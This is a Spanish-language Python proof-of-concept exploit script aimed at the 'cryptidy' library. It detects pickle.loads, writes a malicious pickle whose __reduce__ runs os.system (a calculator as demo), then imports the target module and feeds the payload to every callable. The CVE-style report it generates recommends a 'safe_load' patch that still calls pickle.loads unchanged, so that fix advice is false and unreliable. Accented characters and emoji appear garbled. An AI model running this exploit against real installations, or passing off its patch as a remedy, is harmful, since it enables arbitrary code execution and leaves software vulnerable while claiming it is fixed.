# ejecutar_todo.py
import os
import re
import pickle
import subprocess
from pathlib import Path

# === CONFIGURACI√ìN ===
LIBRERIA = "cryptidy"
ARCHIVO_OBJETIVO = "symmetric_encryption.py"
DIRECTORIO_LIB = None
PAYLOAD_FILENAME = "payload_malicioso.bin"
REPORTE_FILENAME = "cve_report.md"
LOG_FILENAME = "cve_hunter_advanced.log"

# === 1. Localiza librer√≠a ===
def encontrar_libreria():
    global DIRECTORIO_LIB
    venv_path = os.environ.get("VIRTUAL_ENV")
    if not venv_path:
        print("‚ùå No est√°s en un entorno virtual (VENV)")
        exit(1)

    for path in Path(venv_path).rglob("site-packages"):
        if (path / LIBRERIA).exists():
            DIRECTORIO_LIB = path / LIBRERIA
            return
    print("‚ùå Librer√≠a no encontrada")
    exit(1)

# === 2. Buscar vulnerabilidad en el c√≥digo ===
def buscar_vulnerabilidad():
    archivo = DIRECTORIO_LIB / ARCHIVO_OBJETIVO
    vulnerable = False
    hallazgos = []

    if not archivo.exists():
        return vulnerable, hallazgos

    with open(archivo, encoding="utf-8", errors="ignore") as f:
        contenido = f.read()
        if "pickle.loads" in contenido:
            vulnerable = True
            hallazgos.append("üî¥ Uso de pickle.loads detectado")
        if "exec(" in contenido:
            hallazgos.append("üî¥ Uso de exec peligroso")
        if "eval(" in contenido:
            hallazgos.append("üî¥ Uso de eval peligroso")
        if re.search(r"if\s+not\s+\w+\(.*?\)", contenido):
            hallazgos.append("‚ö†Ô∏è Posible bypass l√≥gico")
    return vulnerable, hallazgos

# === 3. Generar payload malicioso ===
def generar_payload():
    class Evil:
        def __reduce__(self):
            if os.name == "nt":
                return (os.system, ("calc",))
            else:
                return (os.system, ("gnome-calculator",))

    payload = pickle.dumps(Evil())
    with open(PAYLOAD_FILENAME, "wb") as f:
        f.write(payload)
    return payload

# === 4. Ejecutar funci√≥n vulnerable si existe ===
def intentar_ejecucion(payload):
    ruta = DIRECTORIO_LIB / ARCHIVO_OBJETIVO
    try:
        modname = f"{LIBRERIA}.{ARCHIVO_OBJETIVO[:-3]}"
        spec = None
        try:
            import importlib.util
            spec = importlib.util.spec_from_file_location(modname, ruta)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
        except Exception as e:
            return f"‚ùå No se pudo importar el m√≥dulo: {e}"

        for attr in dir(mod):
            func = getattr(mod, attr)
            if callable(func):
                try:
                    func(payload)
                except Exception as ex:
                    pass  # RCE ejecutado o fallo esperado
        return "‚úÖ Payload ejecutado (puede haber abierto calculadora)"
    except Exception as e:
        return f"‚ùå Error al intentar ejecutar el payload: {e}"

# === 5. Generar informe tipo CVE ===
def generar_reporte(hallazgos, ejecucion_resultado):
    with open(REPORTE_FILENAME, "w", encoding="utf-8") as f:
        f.write("# üìÑ Informe t√©cnico: CVE POTENCIAL EN cryptidy\n\n")
        f.write("## üß† Descripci√≥n\n")
        f.write("Uso de `pickle.loads` sin validaci√≥n permite ejecuci√≥n remota de c√≥digo (RCE).\n\n")

        f.write("## üìÇ Archivo afectado\n")
        f.write(f"`{LIBRERIA}/{ARCHIVO_OBJETIVO}`\n\n")

        f.write("## üïµÔ∏è Hallazgos\n")
        for h in hallazgos:
            f.write(f"- {h}\n")

        f.write("\n## üí£ Payload generado\n")
        f.write(f"`{PAYLOAD_FILENAME}`\n\n")

        f.write("## ‚öôÔ∏è Resultado de la ejecuci√≥n\n")
        f.write(f"{ejecucion_resultado}\n\n")

        f.write("## üîê Recomendaci√≥n de parche\n")
        f.write("Reemplazar `pickle.loads` por `json.loads` si es posible, o validar entrada:\n")
        f.write("```python\nimport pickle\n\ndef safe_load(data):\n    assert isinstance(data, bytes)\n    return pickle.loads(data)\n```\n")

# === 6. Ejecutar fases 6-10 agresivas ===
def fases_avanzadas():
    with open(LOG_FILENAME, "w", encoding="utf-8") as log:
        for archivo in DIRECTORIO_LIB.rglob("*.py"):
            with open(archivo, encoding="utf-8", errors="ignore") as f:
                contenido = f.read()

            if "__dict__" in contenido:
                log.write(f"{archivo}: uso de __dict__ (fase 6)\n")
            if "__class__" in contenido and ".__bases__" in contenido:
                log.write(f"{archivo}: manipulaci√≥n de clases base (fase 7)\n")
            if re.search(r"decrypt\(.*?,.*?\)", contenido):
                log.write(f"{archivo}: posible inyecci√≥n en decrypt (fase 8)\n")
            if "constant_time" in str(archivo):
                log.write(f"{archivo}: posible comparaci√≥n vulnerable (fase 9)\n")
            if "ctypes" in contenido:
                log.write(f"{archivo}: acceso directo a memoria con ctypes (fase 10)\n")

# === EJECUCI√ìN ===
if __name__ == "__main__":
    print("üîç Buscando librer√≠a...")
    encontrar_libreria()

    print(f"üìÅ Analizando: {DIRECTORIO_LIB / ARCHIVO_OBJETIVO}")
    vulnerable, hallazgos = buscar_vulnerabilidad()

    if not vulnerable:
        print("‚úÖ No se detect√≥ uso de pickle.loads. No es explotable directamente.")
        exit(0)

    print("üí£ Generando payload...")
    payload = generar_payload()

    print("‚öôÔ∏è Intentando ejecuci√≥n...")
    resultado = intentar_ejecucion(payload)

    print("üßæ Generando informe CVE...")
    generar_reporte(hallazgos, resultado)

    print("üß† Lanzando fases agresivas 6‚Äì10...")
    fases_avanzadas()

    print("\n‚úÖ Proceso completo. Revisa:")
    print(f" - {REPORTE_FILENAME}")
    print(f" - {PAYLOAD_FILENAME}")
    print(f" - {LOG_FILENAME}")
